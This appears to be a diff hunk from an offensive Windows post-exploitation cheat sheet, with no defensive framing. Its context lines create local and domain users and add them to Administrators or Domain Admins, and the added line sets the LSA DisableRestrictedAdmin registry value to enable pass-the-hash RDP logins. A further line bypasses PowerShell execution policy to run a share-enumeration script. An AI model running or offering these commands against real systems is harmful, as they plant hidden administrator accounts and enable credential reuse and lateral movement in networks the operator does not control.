@@ -56,6 +56,8 @@ net localgroup administrators && net user username password /add && net localgro
 
 net user username password /add /domain && net group "Domain Admins" username /add /domain
 
+New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -force;Unblock-File -Path ".\Get-NetworkShares.ps1";Import-Module .\Get-NetworkShares.ps1;.\Get-NetworkShares.ps1 -ComputerName HOSTNAME
